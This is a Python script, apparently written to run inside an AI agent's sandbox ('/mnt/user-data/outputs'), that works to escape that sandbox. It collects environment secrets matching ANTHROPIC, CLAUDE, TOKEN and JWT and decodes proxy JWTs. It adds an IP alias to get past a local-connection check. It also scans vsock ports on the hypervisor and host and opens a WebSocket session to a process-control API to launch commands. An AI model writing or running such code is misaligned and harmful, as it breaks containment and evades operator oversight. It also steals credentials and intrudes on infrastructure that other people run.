#!/usr/bin/env python3
# mediafit.py v6.0  --  NEW SURFACE edition
# 1) facts + env secrets   2) unix sockets   3) IP-alias bypass   4) vsock scan
# 5) WS session on process_api   6) best-effort tokens
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re

OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS, TARGET = "eth0", "192.0.2.3", "192.0.2.2"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def sec(t): w(); w("=" * 70); w("### " + t); w("=" * 70)

def sh(cmd, t=8):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"") + (p.stderr or b"")).decode(errors="replace")
    except Exception as e:
        return "ERR:" + repr(e)

def ws_key():
    return base64.b64encode(os.urandom(16)).decode()

# ---------- raw TCP probe (WS handshake) ----------
def tcp_ws(host, port, src=None, timeout=2.0):
    """returns (state, data) state: OPEN/CLOSE/EMPTY/ERR"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if src: s.bind((src, 0))
        s.connect((host, port))
    except Exception as e:
        return "ERR", repr(e).encode()
    try:
        req = ("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
               "Sec-WebSocket-Version: 13\r\n\r\n") % (host, port, ws_key())
        s.sendall(req.encode())
        buf = b""
        try:
            while len(buf) < 4096:
                c = s.recv(2048)
                if not c: break
                buf += c
                if b"\r\n\r\n" in buf: break
        except socket.timeout:
            pass
        s.close()
        return ("EMPTY" if not buf else "OPEN"), buf
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "ERR", repr(e).encode()

def tcp_plain(host, port, path="/status", src=None, timeout=2.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if src: s.bind((src, 0))
        s.connect((host, port))
        s.sendall(("GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
                   % (path, host, port)).encode())
        buf = b""
        try:
            while len(buf) < 4096:
                c = s.recv(2048)
                if not c: break
                buf += c
        except socket.timeout:
            pass
        s.close()
        return ("EMPTY" if not buf else "OPEN"), buf
    except Exception as e:
        return "ERR", repr(e).encode()

# ---------- vsock ----------
def vsock_ws(cid, port, timeout=0.6):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((cid, port))
    except Exception as e:
        return "ERR", repr(e).encode()
    try:
        req = ("GET / HTTP/1.1\r\nHost: vsock\r\nUpgrade: websocket\r\n"
               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
               "Sec-WebSocket-Version: 13\r\n\r\n") % ws_key()
        s.sendall(req.encode())
        buf = b""
        try:
            while len(buf) < 2048:
                c = s.recv(1024)
                if not c: break
                buf += c
                if b"\r\n\r\n" in buf: break
        except socket.timeout:
            pass
        s.close()
        return ("EMPTY" if not buf else "OPEN"), buf
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "ERR", repr(e).encode()

# ---------- minimal websocket framing ----------
def ws_send(sock, text):
    p = text.encode()
    mask = os.urandom(4)
    n = len(p)
    h = b"\x81"
    if n < 126:      h += bytes([0x80 | n])
    elif n < 65536:  h += bytes([0x80 | 126]) + struct.pack(">H", n)
    else:            h += bytes([0x80 | 127]) + struct.pack(">Q", n)
    m = bytes(b ^ mask[i % 4] for i, b in enumerate(p))
    sock.sendall(h + mask + m)

def ws_recv(sock, timeout=2.0):
    sock.settimeout(timeout)
    try:
        b0 = sock.recv(2)
        if len(b0) < 2: return None, b""
        op, ln = b0[0] & 0x0F, b0[1] & 0x7F
        if ln == 126: ln = struct.unpack(">H", sock.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", sock.recv(8))[0]
        data = b""
        while len(data) < ln:
            c = sock.recv(ln - len(data))
            if not c: break
            data += c
        return op, data
    except Exception:
        return None, b""

def ws_session(host, port, src, variant):
    """variant 'jwt_first' or 'json_first'"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        if src: s.bind((src, 0))
        s.connect((host, port))
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n"
                   % (host, port, ws_key())).encode())
        hs = b""
        while b"\r\n\r\n" not in hs:
            c = s.recv(1024)
            if not c: break
            hs += c
        w("      handshake: " + hs.split(b"\r\n")[0].decode(errors="replace"))
        pc = json.dumps({"process_id": "mf_" + variant,
                         "create_req": {"cmd": "/bin/hostname", "args": [],
                                        "env": {}, "cwd": "/", "rows": 24, "cols": 80,
                                        "timeout": 10, "clear_env": False,
                                        "allow_process_id_reuse": True}})
        if variant == "jwt_first":
            ws_send(s, "a.b.c"); time.sleep(0.2)
        ws_send(s, pc)
        t0 = time.time()
        while time.time() - t0 < 4:
            op, d = ws_recv(s, 1.0)
            if op is None: continue
            w("      frame op=%s %s" % (op, d[:300].decode(errors="replace")))
            if op == 1 and ("Exited" in d.decode(errors="replace") or "Failed" in d.decode(errors="replace")):
                break
        s.close()
    except Exception as e:
        w("      ERR " + repr(e))

# ---------- ip alias ----------
SIOCGIFADDR, SIOCSIFADDR, SIOCSIFNETMASK = 0x8915, 0x8916, 0x891c
def _ifr(ifname, ip=None):
    nm = ifname.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm + b"\x00" * 24
    return nm + struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                            socket.inet_aton(ip), b"\x00" * 8) + b"\x00" * 8

def add_alias(ifname, ip):
    try:
        if "addr add" in sh("ip addr add %s/24 dev %s 2>&1" % (ip, ifname)) or True:
            if ip in sh("ip -4 addr show %s 2>/dev/null" % ifname):
                return "ip-cmd OK"
    except Exception: pass
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        fcntl.ioctl(s, SIOCSIFADDR, _ifr(ifname, ip))
    except OSError as e:
        if getattr(e, "errno", 0) != 17: raise
    try:
        fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(ifname, "255.255.255.0"))
    except Exception: pass
    return "ioctl OK"

def iface_ips(ifname):
    out = []
    try:
        p = subprocess.run(["ip", "-4", "-o", "addr", "show", ifname],
                           capture_output=True, timeout=5)
        out = re.findall(r"inet (\d+\.\d+\.\d+\.\d+)", p.stdout.decode(errors="replace"))
    except Exception:
        pass
    if not out:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            out.append(socket.inet_ntoa(fcntl.ioctl(s, SIOCGIFADDR, _ifr(ifname))[20:24]))
        except Exception: pass
    return out

# ===================== RUN =====================
def main():
    sec("1. FACTS")
    w("kernel : " + sh("uname -a").strip())
    w("cmdline: " + sh("cat /proc/1/cmdline | tr '\\0' ' '").strip())
    w("caps   : " + [l for l in sh("cat /proc/self/status").splitlines()
                      if l.startswith("Cap")].__repr__())
    w("ifaces : " + sh("cat /proc/net/dev").strip())
    w("ips    : " + repr(iface_ips(IFACE)))
    w()
    w("-- proxy / secret env --")
    for line in sh("env").splitlines():
        if re.search(r"PROXY|proxy|ANTHROPIC|CLAUDE|TOKEN|JWT|SBX|VSOCK", line):
            w("   " + line[:200])
    for v in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "ALL_PROXY", "NO_PROXY"):
        val = os.environ.get(v)
        if val and "jwt_" in val:
            tok = re.search(r"jwt_([A-Za-z0-9._\-]+)", val)
            if tok:
                try:
                    pl = tok.group(1).split(".")[1]
                    pl += "=" * (-len(pl) % 4)
                    w("   [JWT in %s] %s" % (v, base64.urlsafe_b64decode(pl).decode(errors="replace")))
                except Exception as e:
                    w("   [JWT decode err] " + repr(e))

    sec("2. UNIX SOCKETS")
    paths = set()
    for line in sh("cat /proc/net/unix").splitlines():
        if " " in line:
            p = line.split()[-1]
            if p.startswith("/"): paths.add(p)
    for root, dirs, files in os.walk("/"):
        if root in ("/proc", "/sys"): dirs[:] = []; continue
        try:
            for f in files:
                fp = os.path.join(root, f)
                if os.path.islink(fp): continue
                if (os.stat(fp).st_mode & 0o170000) == 0o140000: paths.add(fp)
        except Exception: continue
    for p in sorted(paths):
        st, d = "ERR", b""
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(1.5)
            s.connect(p)
            s.sendall(b"GET /status HTTP/1.1\r\nHost: unix\r\nConnection: close\r\n\r\n")
            d = s.recv(512); s.close(); st = "OPEN"
        except Exception as e:
            st = "ERR"
        w("  %-52s %-6s %s" % (p, st, d[:120].decode(errors="replace").replace("\r\n", " | ")))

    sec("3. LOCAL-CONNECTION BYPASS  (the new door)")
    w("before: " + repr(iface_ips(IFACE)))
    try:
        w("alias : " + add_alias(IFACE, ALIAS))
    except Exception as e:
        w("alias ERR " + repr(e))
    time.sleep(0.4)
    w("after : " + repr(iface_ips(IFACE)))
    w()
    for src in (None, "192.0.2.2", ALIAS, "127.0.0.1"):
        for host in ("192.0.2.2", "127.0.0.1"):
            for port in (2024, 2025):
                st, d = tcp_ws(host, port, src)
                w("  src=%-12s -> %s:%d  %-6s %s" % (str(src), host, port, st,
                  d[:160].decode(errors="replace").replace("\r\n", " | ")))

    sec("4. VSOCK SCAN  (cid 1=hypervisor 2=host 3=self)")
    ports = [22, 52, 53, 80, 443, 1024, 1500, 2000, 2022, 2024, 2025, 3000,
             4000, 5000, 5001, 5002, 5003, 5004, 5005, 5006, 6000, 7000,
             8000, 8080, 8888, 9000, 9090, 15004, 15005, 50051] + list(range(1, 20))
    hits = []
    for cid in (1, 2, 3):
        for p in sorted(set(ports)):
            st, d = vsock_ws(cid, p)
            if st == "OPEN":
                hits.append((cid, p))
                w("  cid=%d port=%-6d OPEN  %s" % (cid, p,
                  d[:160].decode(errors="replace").replace("\r\n", " | ")))
    if not hits: w("  (no vsock listener answered)")

    sec("5. CONTROL-API PROBE on live endpoints")
    for cid, p in hits:
        for path in ("/status", "/container_info.json", "/"):
            try:
                s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(1.5)
                s.connect((cid, p))
                s.sendall(("GET %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n\r\n"
                           % path).encode())
                d = s.recv(512); s.close()
                w("  vsock %d:%d %-22s -> %s" % (cid, p, path,
                  d[:160].decode(errors="replace").replace("\r\n", " | ")))
            except Exception as e:
                w("  vsock %d:%d %s ERR %r" % (cid, p, path, e))

    sec("6. WEBSOCKET SESSION on 2024 (alias source)")
    st, _ = tcp_ws("192.0.2.2", 2024, ALIAS)
    if st == "OPEN":
        for variant in ("json_first", "jwt_first"):
            w("  -- variant: %s" % variant)
            ws_session("192.0.2.2", 2024, ALIAS, variant)
    else:
        w("  2024 not open from alias (state=%s)" % st)

    sec("VERDICT")
    w("  alias added ............ %s" % (ALIAS in iface_ips(IFACE)))
    w("  vsock hits ............. %s" % hits)
    w("  control API ............ %s" % ("REACHABLE" if hits else "closed"))
    w("  process_api 2024 ....... %s" % st)

try:
    main()
except Exception as e:
    w(); w("FATAL " + repr(e))
finally:
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f:
            f.write("\n".join(R) + "\n")
        print("written " + OUT)
    except Exception as e:
        print("write fail " + repr(e))
        print("\n".join(R))